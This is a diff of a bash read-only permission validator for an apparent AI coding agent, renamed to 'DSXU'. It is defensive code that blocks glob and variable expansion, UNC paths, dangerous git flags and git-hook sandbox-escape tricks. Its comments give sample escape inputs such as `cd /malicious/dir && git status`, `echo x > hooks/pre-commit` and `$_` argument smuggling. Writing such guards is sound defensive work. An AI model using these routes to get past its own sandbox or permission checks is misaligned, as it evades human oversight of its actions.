+    // `*` is inside quotes  -> returns false (glob NOT detected).
     // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns
     // before this function is reached, but we fix the tracker anyway for
     // consistency with the correct implementations in bashSecurity.ts.
@@ -1627,23 +1550,19 @@ function containsUnquotedExpansion(command: string): boolean {
       escaped = true
       continue
     }
-
     // Update quote state
     if (currentChar === "'" && !inDoubleQuote) {
       inSingleQuote = !inSingleQuote
       continue
     }
-
     if (currentChar === '"' && !inSingleQuote) {
       inDoubleQuote = !inDoubleQuote
       continue
     }
-
     // Inside single quotes: everything is literal. Skip.
     if (inSingleQuote) {
       continue
     }
-
     // Check `$` followed by variable-name or special-parameter character.
     // `$` expands inside double quotes AND unquoted (only SQ makes it literal).
     if (currentChar === '$') {
@@ -1652,22 +1571,18 @@ function containsUnquotedExpansion(command: string): boolean {
         return true
       }
     }
-
     // Globs are literal inside double quotes too. Only check unquoted.
     if (inDoubleQuote) {
       continue
     }
-
     // Check for glob characters outside all quotes.
     // These could expand to anything, including dangerous flags.
     if (currentChar && /[?*[\]]/.test(currentChar)) {
       return true
     }
   }
-
   return false
 }
-
 /**
  * Checks if a single command string is read-only based on READONLY_COMMAND_REGEXES.
  * Internal helper function that validates individual commands.
@@ -1684,20 +1599,18 @@ function isCommandReadOnly(command: string): boolean {
     // Remove the stderr redirection for pattern matching
     testCommand = testCommand.slice(0, -5).trim()
   }
-
   // Check for Windows UNC paths that could be vulnerable to WebDAV attacks
   // Do this early to prevent any command with UNC paths from being marked as read-only
   if (containsVulnerableUncPath(testCommand)) {
     return false
   }
-
   // Check for unquoted glob characters and expandable `$` variables that could
   // bypass our regex-based security checks. We can't know what these expand to
   // at runtime, so we can't verify the command is read-only.
   //
   // Globs: `python *` could expand to `python --help` if such a file exists.
   //
-  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
+  // Variables: `uniq --skip-chars=0$_` ...bash expands `$_` at runtime to the
   // last arg of the previous command. With IFS word splitting, this smuggles
   // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
   // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
@@ -1706,16 +1619,14 @@ function isCommandReadOnly(command: string): boolean {
   if (containsUnquotedExpansion(testCommand)) {
     return false
   }
-
   // Tools like git allow `--upload-pack=cmd` to be abbreviated as `--up=cmd`
   // Regex filters can be bypassed, so we use strict allowlist validation instead.
-  // This requires defining a set of known safe flags. Claude can help with this,
+  // This requires defining a set of known safe flags. DSXU can help with this,
   // but please look over it to ensure it didn't add any flags that allow file writes
   // code execution, or network requests.
   if (isCommandSafeViaFlagParsing(testCommand)) {
     return true
   }
-
   for (const regex of READONLY_COMMAND_REGEXES) {
     if (regex.test(testCommand)) {
       // Prevent git commands with -c flag to avoid config options that can lead to code execution
@@ -1726,7 +1637,6 @@ function isCommandReadOnly(command: string): boolean {
       if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
         return false
       }
-
       // Prevent git commands with --exec-path flag to avoid path manipulation that can lead to code execution
       // The --exec-path flag allows overriding the directory where git looks for executables
       if (
@@ -1735,7 +1645,6 @@ function isCommandReadOnly(command: string): boolean {
       ) {
         return false
       }
-
       // Prevent git commands with --config-env flag to avoid config injection via environment variables
       // The --config-env flag allows setting git config values from environment variables, which can be
       // just as dangerous as -c flag (e.g., core.fsmonitor, diff.external, core.gitProxy)
@@ -1750,7 +1659,6 @@ function isCommandReadOnly(command: string): boolean {
   }
   return false
 }
-
 /**
  * Checks if a compound command contains any git command.
  *
@@ -1762,7 +1670,6 @@ function commandHasAnyGit(command: string): boolean {
     isNormalizedGitCommand(subcmd.trim()),
   )
 }
-
 /**
  * Git-internal path patterns that can be exploited for sandbox escape.
  * If a command creates these files and then runs git, the git command
@@ -1774,7 +1681,6 @@ const GIT_INTERNAL_PATTERNS = [
   /^refs(?:\/|$)/,
   /^hooks(?:\/|$)/,
 ]
-
 /**
  * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
  */
@@ -1783,10 +1689,8 @@ function isGitInternalPath(path: string): boolean {
   const normalized = path.replace(/^\.?\//, '')
   return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
 }
-
 // Commands that only delete or modify in-place (don't create new files at new paths)
 const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])
-
 /**
  * Extracts write paths from a subcommand using PATH_EXTRACTORS.
  * Only returns paths for commands that can create new files/directories
@@ -1795,15 +1699,12 @@ const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])
 function extractWritePathsFromSubcommand(subcommand: string): string[] {
   const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
   if (!parseResult.success) return []
-
   const tokens = parseResult.tokens.filter(
     (t): t is string => typeof t === 'string',
   )
   if (tokens.length === 0) return []
-
   const baseCmd = tokens[0]
   if (!baseCmd) return []
-
   // Only consider commands that can create files at target paths
   if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
     return []
@@ -1815,13 +1716,10 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
   ) {
     return []
   }
-
   const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
   if (!extractor) return []
-
   return extractor(tokens.slice(1))
 }
-
 /**
  * Checks if a compound command writes to any git-internal paths.
  * This is used to detect potential sandbox escape attacks where a command
@@ -1839,10 +1737,8 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
  */
 function commandWritesToGitInternalPaths(command: string): boolean {
   const subcommands = splitCommand_DEPRECATED(command)
-
   for (const subcmd of subcommands) {
     const trimmed = subcmd.trim()
-
     // Check write paths from path-based commands (mkdir, touch, cp, mv)
     const writePaths = extractWritePathsFromSubcommand(trimmed)
     for (const path of writePaths) {
@@ -1850,7 +1746,6 @@ function commandWritesToGitInternalPaths(command: string): boolean {
         return true
       }
     }
-
     // Check output redirections (e.g., echo x > hooks/pre-commit)
     const { redirections } = extractOutputRedirections(trimmed)
     for (const { target } of redirections) {
@@ -1859,10 +1754,8 @@ function commandWritesToGitInternalPaths(command: string): boolean {
       }
     }
   }
-
   return false
 }
-
 /**
  * Checks read-only constraints for bash commands.
  * This is the single exported function that validates whether a command is read-only.
@@ -1878,7 +1771,6 @@ export function checkReadOnlyConstraints(
   compoundCommandHasCd: boolean,
 ): PermissionResult {
   const { command } = input
-
   // Detect if the command is not parseable and return early
   const result = tryParseShellCommand(command, env => `$${env}`)
   if (!result.success) {
@@ -1887,7 +1779,6 @@ export function checkReadOnlyConstraints(
       message: 'Command cannot be parsed, requires further permission checks',
     }
   }
-
   // Check the original command for safety before splitting
   // This is important because splitCommand_DEPRECATED may transform the command
   // (e.g., ${VAR} becomes $VAR)
@@ -1897,7 +1788,6 @@ export function checkReadOnlyConstraints(
       message: 'Command is not read-only, requires further permission checks',
     }
   }
-
   // Check for Windows UNC paths in the original command before transformation
   // This must be done before splitCommand_DEPRECATED because splitCommand_DEPRECATED may transform backslashes
   if (containsVulnerableUncPath(command)) {
@@ -1907,10 +1797,8 @@ export function checkReadOnlyConstraints(
         'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
     }
   }
-
   // Check once if any subcommand is a git command (used for multiple security checks below)
   const hasGitCommand = commandHasAnyGit(command)
-
   // SECURITY: Block compound commands that have both cd AND git
   // This prevents sandbox escape via: cd /malicious/dir && git status
   // where the malicious directory contains fake git hooks that execute arbitrary code.
@@ -1921,7 +1809,6 @@ export function checkReadOnlyConstraints(
         'Compound commands with cd and git require permission checks for enhanced security',
     }
   }
-
   // SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
   // This prevents sandbox escape when an attacker has:
   // 1. Deleted .git/HEAD to invalidate the normal git directory
@@ -1934,7 +1821,6 @@ export function checkReadOnlyConstraints(
         'Git commands in directories with bare repository structure require permission checks for enhanced security',
     }
   }
-
   // SECURITY: Block compound commands that write to git-internal paths AND run git
   // This prevents sandbox escape where a command creates git-internal files
   // (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
@@ -1947,7 +1833,6 @@ export function checkReadOnlyConstraints(
         'Compound commands that create git internal files and run git require permission checks for enhanced security',
     }
   }
-
   // SECURITY: Only auto-allow git commands as read-only if we're in the original cwd
   // (which is protected by sandbox denyWrite) or if sandbox is disabled (attack is moot).
   // Race condition: a sandboxed command can create bare repo files in a subdirectory,
@@ -1964,7 +1849,6 @@ export function checkReadOnlyConstraints(
         'Git commands outside the original working directory require permission checks when sandbox is enabled',
     }
   }
-
   // Check if all subcommands are read-only
   const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
     subcmd => {
@@ -1974,17 +1858,41 @@ export function checkReadOnlyConstraints(
       return isCommandReadOnly(subcmd)
     },
   )
-
   if (allSubcommandsReadOnly) {
     return {
       behavior: 'allow',
       updatedInput: input,
     }
   }
-
   // If not read-only, return passthrough to let other permission checks handle it
   return {
     behavior: 'passthrough',
     message: 'Command is not read-only, requires further permission checks',
+  }
+}
+export function getDsxuBashReadOnlyRuntimeProfile(): {
+  runtime: 'DSXU Bash Read-only Validator'
+  allowlistSize: number
+  regexCount: number
+  securityGuards: readonly string[]
+  activationEvidence: readonly string[]
+} {
+  return {
+    runtime: 'DSXU Bash Read-only Validator',
+    allowlistSize: Object.keys(COMMAND_ALLOWLIST).length,
+    regexCount: READONLY_COMMAND_REGEXES.size,
+    securityGuards: [
+      'Windows UNC/WebDAV path rejection',
+      'unquoted glob and variable-expansion rejection',
+      'git -c/--exec-path/--config-env rejection',
+      'compound cd+git sandbox-escape guard',
+      'git-internal write plus git execution guard',
+      'sandbox original-cwd guard for git commands',
+    ],
+    activationEvidence: [
+      'checkReadOnlyConstraints returns allow only when every subcommand validates read-only',
+      'DSXU CLI help commands are explicitly recognized',
+      'legacy provider CLI help commands remain migration-only read-only entries',
+    ],
   }
 }
